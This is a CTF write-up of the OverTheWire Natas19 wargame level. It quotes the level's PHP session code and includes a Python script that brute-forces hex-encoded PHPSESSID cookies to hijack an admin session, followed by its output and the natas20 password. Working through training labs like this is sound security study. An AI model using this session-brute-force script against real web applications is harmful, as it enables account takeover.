# CTF Writeup - **OverTheWire Natas18 - Natas19**

**Author**: spiketyson 

---

## Challenge Details

- **Challenge Name:** Natas18 - Natas19
- **Category:** Linux
- **Difficulty Level:** Easy
- **Date:** 18-12-2024

---

## Summary

This challenge is the introductory level for the Natas series on OverTheWire, focusing on web exploitation. The goal is to find the flag that is hidden web server using burpsuite if possible.

---

## Approach

Since this is an basic challenge, I planned to use python to find the flag using session hijacking.

---

## Solution Walkthrough

Connecting to the web server using:

```bash
Username: natas19
Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
URL:      http://natas19.natas.labs.overthewire.org
```

After logging in, we can see that the webpage asks for an input username and password.  But we dont know anything about it, So lets input some random names and check it out. 

```bash
This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
Please login with your admin account to retrieve credentials for natas20.
Username: natas
password: natas 
# You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.
```

Now we see that it doesnot check out input and only prints the above. This is interesting. Lets view the source code since we know that the source code is in `http://natas19.natas.labs.overthewire.org/index-source.html`.

```bash
# <?php

# $maxid = 640; // 640 should be enough for everyone

# function myhex2bin($h) { /* {{{ */
#   if (!is_string($h)) return null;
#   $r='';
#   for ($a=0; $a<strlen($h); $a+=2) { $r.=chr(hexdec($h[$a].$h[($a+1)])); }
#   return $r;
# }
# /* }}} */
# function isValidAdminLogin() { /* {{{ */
#     if($_REQUEST["username"] == "admin") {
#     /* This method of authentication appears to be unsafe and has been disabled for now. */
#         //return 1;
#     }

#     return 0;
# }
# /* }}} */
# function isValidID($id) { /* {{{ */
#     // must be lowercase
#     if($id != strtolower($id)) {
#         return false;
#     }

#     // must decode
#     $decoded = myhex2bin($id);

#     // must contain a number and a username
#     if(preg_match('/^(?P<id>\d+)-(?P<name>\w+)$/', $decoded, $matches)) {
#         return true;
#     }

#     return false;
# }
# /* }}} */
# function createID($user) { /* {{{ */
#     global $maxid;
#     $idnum = rand(1, $maxid);
#     $idstr = "$idnum-$user";
#     return bin2hex($idstr);
# }
# /* }}} */
# function debug($msg) { /* {{{ */
#     if(array_key_exists("debug", $_GET)) {
#         print "DEBUG: $msg<br>";
#     }
# }
# /* }}} */
# function my_session_start() { /* {{{ */
#     if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
#     if(!session_start()) {
#         debug("Session start failed");
#         return false;
#     } else {
#         debug("Session start ok");
#         if(!array_key_exists("admin", $_SESSION)) {
#         debug("Session was old: admin flag set");
#         $_SESSION["admin"] = 0; // backwards compatible, secure
#         }
#         return true;
#     }
#     }

#     return false;
# }
# /* }}} */
# function print_credentials() { /* {{{ */
#     if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
#     print "You are an admin. The credentials for the next level are:<br>";
#     print "<pre>Username: natas20\n";
#     print "Password: <censored></pre>";
#     } else {
#     print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas20.";
#     }
# }
# /* }}} */

# $showform = true;
# if(my_session_start()) {
#     print_credentials();
#     $showform = false;
# } else {
#     if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
#     session_id(createID($_REQUEST["username"]));
#     session_start();
#     $_SESSION["admin"] = isValidAdminLogin();
#     debug("New session started");
#     $showform = false;
#     print_credentials();
#     }
# }

# if($showform) {
# ?>
```

We can see that there is a small piece of code that is executed when we click on submit. This PHP script manages a session-based authentication system with debug functionality, allowing users to log in and retrieve credentials if they have administrative privileges. The script starts by validating sessions through `my_session_start()`, which checks for a valid numeric `PHPSESSID` cookie and initializes the `admin` flag in the session if it does not exist. If no valid session exists, and the user submits a `username` and `password`, a session is created with a random ID generated using the random number and the input username by `createID()` and converted to hexadecimal, but the admin flag is always set to `0` because the `isValidAdminLogin()` function (which checks if the username is "admin") is commented out and disabled. The `debug()` function outputs messages when the debug parameter is present in the URL, aiding in troubleshooting. The `print_credentials()` function displays the next level's credentials only if the session's admin flag is set to 1, otherwise informing the user they are logged in as a regular user. The script concludes by displaying credentials for `admin` users or informing non-admins of their status. However, the session ID generation is predictable, and the disabled admin login check highlights vulnerabilities that could be exploited for session hijacking or bypassing authentication. One thing we need to note here is that the `createID` function generates a random number between 1 and 640 and then creates a string with the number appended to the username like `212-admin` then it converts this to hexadecimal and then stores it in the PHPSESSIONID. Since, 640 is a less number we can brute force it. 


```bash
import requests

target = 'http://natas19.natas.labs.overthewire.org'
auth = ('natas19','tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr')
params = dict(username='admin', password='s3cr3t')
cookies = dict()

max_s_id = 640
s_id = 1
while s_id <= max_s_id:
	print ("Trying with PHPSESSID = " + str(s_id) + " " + (str(s_id)+"-admin").encode("utf-8").hex())
	cookies = dict(PHPSESSID=(str(s_id)+"-admin").encode("utf-8").hex())
	r = requests.get(target, auth=auth, params=params, cookies=cookies)
	if "You are an admin" in r.text:
		print(r.text)
		break
	s_id += 1
```

What we are doing here is that we are essentially we are trying out all possible `PHPSESSIONID` as `640` is a very small range. We can see that the password is displayed when the `PHPSESSIONID  = hex(281-admin)` as shwon below. 

```bash
# Trying with PHPSESSID = 1 312d61646d696e
# Trying with PHPSESSID = 2 322d61646d696e
# ...
# ...
# Trying with PHPSESSID = 280 3238302d61646d696e
# Trying with PHPSESSID = 281 3238312d61646d696e
# <html>
# <head>
# <!-- This stuff in the header has nothing to do with the level -->
# <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
# <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
# <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
# <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
# <script>var wechallinfo = { "level": "natas19", "pass": "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr" };</script></head>
# <body>
# <h1>natas19</h1>
# <div id="content">
# <p>
# <b>
# This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
# </b>
# </p>
# You are an admin. The credentials for the next level are:<br><pre>Username: natas20
# Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw</pre></div>
# </body>
# </html>
```


## Flag

**Flag:** p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw


---

## Lessons Learned

It was a bit of challenge for me. I was able to grasp the idead behind the solution very easily. I learnt a lot on how to approach these types of challenges.